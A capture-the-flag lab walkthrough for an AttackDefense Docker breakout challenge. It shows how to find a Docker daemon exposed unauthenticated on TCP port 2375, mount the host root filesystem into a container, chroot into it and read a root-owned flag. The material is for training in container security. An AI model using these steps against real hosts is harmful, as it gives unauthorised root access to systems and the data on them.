### Name : Misconfigured Docker Socket
### URL : https://attackdefense.com/challengedetails?cid=1194
### Type DevSecOps : Docker Breakouts  


  
**Important Note**: This document illustrates all the important steps required to complete this lab.
This is by no means a comprehensive step-by-step solution for this exercise. This is only
provided as a reference to various commands needed to complete this exercise and for your
further research on this topic. Also, note that the IP addresses and domain names might be
different in your lab.  

  
**Objective**: Leverage the unprotected TCP socket to escalate privileges and retrieve the flag
stored in the root directory of the host system!  

#### 1. List all processes listening on TCP ports of the local machine

```bash
sudo netstat  -nlptu
```
Conventionally Docker daemon is configured to listen on port 2375 for API requests sent over
unencrypted connections. Whereas 2376 is used for encrypted connections.

#### 2. Verify if the port 2375 is being used by the docker daemon.

```bash
curl localhost:2375/version
```
  
Output confirms that the Docker daemon is listening on TCP port 2375.  


#### 3. Docker client is installed on the host machine. Configure docker client to use the TCP Socket.  

```bash
export DOCKER_HOST="tcp://localhost:2375"
```

#### 4. Check the images available on local machine.

```
docker images
```

#### 5. Start an Ubuntu container. Mount root filesystem of host machine on /host directory of the container.

```bash
docker run -it -v /:/host/ ubuntu:18.04 bash
```

#### 6. Change to /host directory and list the files.  

```bash
cd /host/
ls -l
```

#### 7. Use chroot on the /host directory.  

```bash
chroot ./ bash
```

#### 8. Retrieve the flag.  

```bash
find / -name flag 2>/dev/null
cat /root/flag
```